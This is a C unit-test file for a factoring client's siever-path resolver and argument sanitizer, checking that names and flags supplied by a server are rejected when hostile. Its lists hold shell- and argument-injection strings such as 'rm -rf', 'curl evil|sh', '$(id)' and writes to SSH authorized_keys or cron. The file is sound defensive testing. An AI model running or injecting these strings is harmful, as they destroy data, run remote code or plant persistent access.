#define _POSIX_C_SOURCE 200809L
/* siever_resolve_test.c — unit tests for sieve_resolve_siever().
 *
 * Links sieve_executor.o directly: no server, no network, no DB. Builds a
 * throwaway siever directory under /tmp and drives the resolver.
 *
 * Two groups matter for different reasons:
 *
 *   "configured is a FILE" is a REGRESSION guard. Every deployment today
 *   passes --siever=<path to one binary>, and this change must not alter
 *   what any of them do — including passing a nonexistent path straight
 *   through so the siever exits 127, exactly as before.
 *
 *   "server_name validation" is the reason this function was extracted at
 *   all. The resolved path is formatted into a command string that
 *   run_child_cancelable hands to /bin/sh -c, and server_name arrives over
 *   plain unauthenticated HTTP, so a name carrying a shell metacharacter
 *   would be a remote command execution path that did not exist before.
 *
 *   make test    (or: cc -I. tests/siever_resolve_test.c sieve_executor.o \
 *                        -o tests/siever_resolve_test -lpthread)
 */
#include "sieve_executor.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

static int fails = 0, checks = 0;
#define CK(cond, ...) do { checks++; if (!(cond)) { \
    fails++; printf("  FAIL %s:%d: ", __func__, __LINE__); \
    printf(__VA_ARGS__); printf("\n"); } } while (0)

/* mkdtemp, not a fixed /tmp name: a fixed path in a world-writable directory
 * lets a leftover from an interrupted run, another user on a shared box, or a
 * planted symlink decide what the NOT_FOUND assertions actually measure -- and
 * two concurrent `make test` runs would clobber each other. */
static char DIR_OK[64];
static char DIR_SUB[128];
#define NAME16   "gnfs-lasieve4I16e"
#define NAME14   "gnfs-lasieve4I14e"

static void write_file(const char *path, mode_t mode)
{
    FILE *f = fopen(path, "wb");
    if (!f) { fprintf(stderr, "cannot create %s\n", path); exit(1); }
    fputs("#!/bin/sh\nexit 0\n", f);
    fclose(f);
    if (chmod(path, mode) != 0) { fprintf(stderr, "chmod %s\n", path); exit(1); }
}

static void fixture_build(void)
{
    char p[512];
    snprintf(DIR_OK, sizeof(DIR_OK), "/tmp/ggnfs_resolve_test.XXXXXX");
    if (!mkdtemp(DIR_OK)) { perror("mkdtemp"); exit(1); }
    snprintf(DIR_SUB, sizeof(DIR_SUB), "%s/gnfs-lasieve4I99e", DIR_OK);

    snprintf(p, sizeof(p), "%s/%s", DIR_OK, NAME16); write_file(p, 0755);
    snprintf(p, sizeof(p), "%s/%s", DIR_OK, NAME14); write_file(p, 0644);
    if (mkdir(DIR_SUB, 0755) != 0) {   /* a DIRECTORY named like a siever */
        perror("mkdir"); exit(1);
    }
}

static void fixture_destroy(void)
{
    char p[512];
    snprintf(p, sizeof(p), "%s/%s", DIR_OK, NAME16); remove(p);
    snprintf(p, sizeof(p), "%s/%s", DIR_OK, NAME14); remove(p);
    remove(DIR_SUB);
    remove(DIR_OK);
}

/* ---- configured is a FILE: must behave exactly as it does today --------- */
static void test_file_passthrough(void)
{
    char out[256];
    char file[512];
    snprintf(file, sizeof(file), "%s/%s", DIR_OK, NAME16);

    CK(sieve_resolve_siever(file, NAME16, out, sizeof(out)) == SIEVE_RESOLVE_OK
       && strcmp(out, file) == 0, "matching basename should pass through");

    /* The warn-only behaviour survives for the file form: an operator who
     * pins a binary gets the binary they pinned, mismatch or not. */
    CK(sieve_resolve_siever(file, NAME14, out, sizeof(out)) == SIEVE_RESOLVE_OK
       && strcmp(out, file) == 0, "mismatched basename still passes through");

    /* A path that does not exist reaches the siever and exits 127, as today.
     * Tightening this would break deployments for no gain. */
    CK(sieve_resolve_siever("/nonexistent/gnfs-lasieve4I16e", NAME16,
                            out, sizeof(out)) == SIEVE_RESOLVE_OK,
       "nonexistent configured path passes through");

    /* A file is never validated against server_name, so even a hostile name
     * cannot change which binary a pinned --siever runs. */
    CK(sieve_resolve_siever(file, "x; rm -rf /", out, sizeof(out))
       == SIEVE_RESOLVE_OK && strcmp(out, file) == 0,
       "file form ignores server_name entirely");
}

/* ---- configured is a DIRECTORY ----------------------------------------- */
static void test_dir_resolution(void)
{
    char out[256], want[512];

    snprintf(want, sizeof(want), "%s/%s", DIR_OK, NAME16);
    CK(sieve_resolve_siever(DIR_OK, NAME16, out, sizeof(out)) == SIEVE_RESOLVE_OK
       && strcmp(out, want) == 0, "resolves to <dir>/<name>, got '%s'", out);

    /* Exactly one separator regardless of how the operator typed the dir. */
    char slashed[96];
    snprintf(slashed, sizeof(slashed), "%s/", DIR_OK);
    CK(sieve_resolve_siever(slashed, NAME16, out, sizeof(out)) == SIEVE_RESOLVE_OK
       && strcmp(out, want) == 0, "trailing slash, got '%s'", out);
    snprintf(slashed, sizeof(slashed), "%s///", DIR_OK);
    CK(sieve_resolve_siever(slashed, NAME16, out, sizeof(out)) == SIEVE_RESOLVE_OK
       && strcmp(out, want) == 0, "several trailing slashes, got '%s'", out);

    /* The root is its own case: trimming "/" to itself would emit "//name". */
    CK(sieve_resolve_siever("/", "gnfs-lasieve4I16e", out, sizeof(out))
       != SIEVE_RESOLVE_OK || strncmp(out, "//", 2) != 0,
       "root dir must not produce a '//' prefix, got '%s'", out);

    CK(sieve_resolve_siever(DIR_OK, "gnfs-lasieve4I15e", out, sizeof(out))
       == SIEVE_RESOLVE_NOT_FOUND, "absent binary is NOT_FOUND");

    /* Present but 0644. Distinct from NOT_FOUND because the operator fix
     * differs: chmod here, copy a binary there. */
    CK(sieve_resolve_siever(DIR_OK, NAME14, out, sizeof(out))
       == SIEVE_RESOLVE_NOT_EXEC, "non-executable is NOT_EXEC");

    /* access(X_OK) alone succeeds on a searchable directory, so this is what
     * catches an S_ISREG check that was left out. */
    CK(sieve_resolve_siever(DIR_OK, "gnfs-lasieve4I99e", out, sizeof(out))
       == SIEVE_RESOLVE_NOT_EXEC, "a subdirectory must not resolve");

    /* Every failure leaves `out` empty rather than a half-built path, so a
     * caller that ignores the return code cannot exec something arbitrary. */
    CK(out[0] == '\0', "out is cleared on failure");
}

/* ---- server_name validation: the reason this is a separate function ----- */
static void test_name_validation(void)
{
    char out[256];
    static const char *hostile[] = {
        "",                          /* empty                               */
        "/bin/sh",                   /* absolute                            */
        "../../bin/sh",              /* traversal                           */
        "sub/gnfs-lasieve4I16e",     /* any separator at all                */
        "gnfs-lasieve4I16e; rm -rf ~",
        "gnfs-lasieve4I16e && curl evil|sh",
        "gnfs-lasieve4I16e $(id)",
        "gnfs-lasieve4I16e `id`",
        "gnfs-lasieve4I16e\nid",
        "gnfs-lasieve4I16e e",       /* embedded space                      */
        "-rf",                       /* leading dash: looks like a flag     */
        ".",
        "..",
        "bash",                      /* real binary, wrong shape            */
        "gnfs-lasieve4I16",          /* no variant letter                   */
        "gnfs-lasieve4Ie",           /* no digits                           */
        "gnfs-lasieve4I123e",        /* three digits                        */
        "GNFS-LASIEVE4I16E",         /* case matters                        */
        "lasieve4I16e",              /* missing prefix                      */
    };
    for (size_t i = 0; i < sizeof(hostile)/sizeof(hostile[0]); i++) {
        int rc = sieve_resolve_siever(DIR_OK, hostile[i], out, sizeof(out));
        CK(rc == SIEVE_RESOLVE_BAD_NAME,
           "must reject server_name '%s' (got %d)", hostile[i], rc);
        CK(out[0] == '\0', "out cleared for rejected '%s'", hostile[i]);
    }

    /* An over-long name is refused before it can be joined to anything. */
    char longname[256];
    memset(longname, 'a', sizeof(longname) - 1);
    longname[sizeof(longname) - 1] = '\0';
    memcpy(longname, "gnfs-lasieve4I16e", 17);
    CK(sieve_resolve_siever(DIR_OK, longname, out, sizeof(out))
       == SIEVE_RESOLVE_BAD_NAME, "over-long name rejected");

    /* Names the fleet legitimately uses, so the check is not too tight. */
    static const char *ok[] = { "gnfs-lasieve4I11e", "gnfs-lasieve4I14e",
                                "gnfs-lasieve4I15e", "gnfs-lasieve4I16e" };
    for (size_t i = 0; i < sizeof(ok)/sizeof(ok[0]); i++) {
        int rc = sieve_resolve_siever(DIR_OK, ok[i], out, sizeof(out));
        CK(rc != SIEVE_RESOLVE_BAD_NAME,
           "must accept the shape of '%s' (got %d)", ok[i], rc);
    }
}

/* ---- boundaries --------------------------------------------------------- */
static void test_boundaries(void)
{
    char out[256];

    /* --engine=cuda: nothing configured, and that is not an error. */
    CK(sieve_resolve_siever("", NAME16, out, sizeof(out)) == SIEVE_RESOLVE_NONE
       && out[0] == '\0', "empty configured is NONE");
    CK(sieve_resolve_siever(NULL, NAME16, out, sizeof(out)) == SIEVE_RESOLVE_NONE,
       "NULL configured is NONE");

    /* Truncation must be an error, never a silently shortened path that
     * happens to name something else. */
    char small[8];
    CK(sieve_resolve_siever(DIR_OK, NAME16, small, sizeof(small))
       == SIEVE_RESOLVE_TOO_LONG && small[0] == '\0',
       "truncation is TOO_LONG and clears out");

    char tiny[4];
    CK(sieve_resolve_siever("/some/long/configured/file/path", NAME16,
                            tiny, sizeof(tiny)) == SIEVE_RESOLVE_TOO_LONG,
       "file form also reports truncation");

    CK(sieve_resolve_siever(DIR_OK, NAME16, out, 0) == SIEVE_RESOLVE_TOO_LONG,
       "zero-length buffer is refused");
}

/* ---- server-supplied tuning flags --------------------------------------
 *
 * The point of these: a whitelist is the only thing that stops ARGUMENT
 * injection, which is distinct from shell injection and which an argv array
 * would not prevent. "-o /home/you/.ssh/authorized_keys" has no metacharacter
 * in it and is a perfectly well-formed argument; it just happens to redirect
 * the siever's output somewhere it must never write.
 */
static void test_args_accepts_real_campaigns(void)
{
    char out[192], bad[160];

    /* What prod actually ships (AS276's meta.siever_args). */
    CK(sieve_sanitize_args(SIEVE_ARGS_LASIEVE4, "-J 16", out, sizeof(out),
                           bad, sizeof(bad)) == SIEVE_ARGS_OK
       && strcmp(out, "-J 16") == 0, "-J 16 must survive, got '%s'", out);

    /* Empty is the common case (snfs301) and is not an error. */
    CK(sieve_sanitize_args(SIEVE_ARGS_LASIEVE4, "", out, sizeof(out),
                           bad, sizeof(bad)) == SIEVE_ARGS_OK
       && out[0] == '\0', "empty args are fine");
    CK(sieve_sanitize_args(SIEVE_ARGS_LASIEVE4, NULL, out, sizeof(out),
                           bad, sizeof(bad)) == SIEVE_ARGS_OK, "NULL is fine");

    /* Exactly what derive_gpu_args emits, so the client never refuses its
     * own derivation. */
    CK(sieve_sanitize_args(SIEVE_ARGS_CUDA, "--logI 17 --J 32768",
                           out, sizeof(out), bad, sizeof(bad)) == SIEVE_ARGS_OK
       && strcmp(out, "--logI 17 --J 32768") == 0,
       "derived cuda geometry must survive, got '%s'", out);

    /* --flag=value is accepted and normalised to the space form. */
    CK(sieve_sanitize_args(SIEVE_ARGS_CUDA, "--logI=16 --J=16384",
                           out, sizeof(out), bad, sizeof(bad)) == SIEVE_ARGS_OK
       && strcmp(out, "--logI 16 --J 16384") == 0,
       "= form normalises, got '%s'", out);

    /* Extra whitespace is not significant. */
    CK(sieve_sanitize_args(SIEVE_ARGS_LASIEVE4, "   -J    14   ",
                           out, sizeof(out), bad, sizeof(bad)) == SIEVE_ARGS_OK
       && strcmp(out, "-J 14") == 0, "whitespace tolerated, got '%s'", out);
}

static void test_args_rejects_hostile(void)
{
    char out[192], bad[160];

    /* ARGUMENT injection: every one of these is shell-clean. An argv array
     * would pass them straight through to the siever. */
    static const char *arg_injection[] = {
        "-o /home/user/.ssh/authorized_keys",
        "-J 16 -o /etc/cron.d/x",
        "-v",
        "--help",
        "-f 1",                       /* we set -f ourselves */
        "-c 1",                       /* and -c */
        "-a /etc/passwd",
    };
    for (size_t i = 0; i < sizeof(arg_injection)/sizeof(arg_injection[0]); i++) {
        int rc = sieve_sanitize_args(SIEVE_ARGS_LASIEVE4, arg_injection[i],
                                     out, sizeof(out), bad, sizeof(bad));
        CK(rc != SIEVE_ARGS_OK, "must refuse argument injection '%s'",
           arg_injection[i]);
    }

    /* Shell injection, refused here as well as by the absence of a shell. */
    static const char *shell_injection[] = {
        "-J 16; curl evil|sh",
        "-J 16 && id",
        "-J $(id)",
        "-J `id`",
        "-J 16 | tee /tmp/x",
    };
    for (size_t i = 0; i < sizeof(shell_injection)/sizeof(shell_injection[0]); i++) {
        int rc = sieve_sanitize_args(SIEVE_ARGS_LASIEVE4, shell_injection[i],
                                     out, sizeof(out), bad, sizeof(bad));
        CK(rc != SIEVE_ARGS_OK, "must refuse shell injection '%s'",
           shell_injection[i]);
        CK(out[0] == '\0', "out cleared for '%s'", shell_injection[i]);
    }

    /* A value that is not an integer cannot reach the command line. */
    CK(sieve_sanitize_args(SIEVE_ARGS_LASIEVE4, "-J sixteen", out, sizeof(out),
                           bad, sizeof(bad)) != SIEVE_ARGS_OK,
       "non-numeric value refused");
    CK(sieve_sanitize_args(SIEVE_ARGS_LASIEVE4, "-J 16x", out, sizeof(out),
                           bad, sizeof(bad)) != SIEVE_ARGS_OK,
       "trailing garbage refused");
    CK(sieve_sanitize_args(SIEVE_ARGS_LASIEVE4, "-J", out, sizeof(out),
                           bad, sizeof(bad)) == SIEVE_ARGS_NOVALUE,
       "flag with no value refused");

    /* Out of range. */
    CK(sieve_sanitize_args(SIEVE_ARGS_LASIEVE4, "-J 0", out, sizeof(out),
                           bad, sizeof(bad)) == SIEVE_ARGS_RANGE, "-J 0");
    CK(sieve_sanitize_args(SIEVE_ARGS_LASIEVE4, "-J 999", out, sizeof(out),
                           bad, sizeof(bad)) == SIEVE_ARGS_RANGE, "-J 999");
    CK(sieve_sanitize_args(SIEVE_ARGS_LASIEVE4, "-J -5", out, sizeof(out),
                           bad, sizeof(bad)) == SIEVE_ARGS_RANGE, "-J -5");

    /* The vocabularies are separate: cuda flags are not lasieve4 flags and
     * vice versa. Crossing them describes a different sieve area entirely. */
    CK(sieve_sanitize_args(SIEVE_ARGS_LASIEVE4, "--logI 16", out, sizeof(out),
                           bad, sizeof(bad)) == SIEVE_ARGS_UNKNOWN,
       "cuda flag refused in the lasieve4 vocabulary");
    CK(sieve_sanitize_args(SIEVE_ARGS_CUDA, "-J 16", out, sizeof(out),
                           bad, sizeof(bad)) == SIEVE_ARGS_UNKNOWN,
       "lasieve4 -J refused in the cuda vocabulary");

    /* The offending token is reported, so the operator can act on it. */
    sieve_sanitize_args(SIEVE_ARGS_LASIEVE4, "-J 16 -o /etc/x", out,
                        sizeof(out), bad, sizeof(bad));
    CK(strstr(bad, "-o") != NULL, "bad token names the flag, got '%s'", bad);
}

static void test_args_boundaries(void)
{
    char out[192], bad[160];
    char small[4];   /* "-J 16" needs 6 with the NUL */

    CK(sieve_sanitize_args(SIEVE_ARGS_LASIEVE4, "-J 16", small, sizeof(small),
                           bad, sizeof(bad)) == SIEVE_ARGS_TOO_LONG
       && small[0] == '\0', "truncation refused and out cleared");

    /* A token longer than the internal scratch must not overflow it. */
    char huge[400];
    memset(huge, 'x', sizeof(huge) - 1);
    huge[sizeof(huge) - 1] = '\0';
    CK(sieve_sanitize_args(SIEVE_ARGS_LASIEVE4, huge, out, sizeof(out),
                           bad, sizeof(bad)) != SIEVE_ARGS_OK,
       "absurd token refused");

    /* NULL `bad` is allowed. */
    CK(sieve_sanitize_args(SIEVE_ARGS_LASIEVE4, "-v", out, sizeof(out),
                           NULL, 0) != SIEVE_ARGS_OK, "NULL bad buffer is ok");
}

int main(void)
{
    fixture_build();

    printf("siever_resolve_test\n");
    test_file_passthrough();
    test_dir_resolution();
    test_name_validation();
    test_boundaries();
    test_args_accepts_real_campaigns();
    test_args_rejects_hostile();
    test_args_boundaries();

    fixture_destroy();

    printf("  %d checks, %d failures\n", checks, fails);
    return fails ? 1 : 0;
}
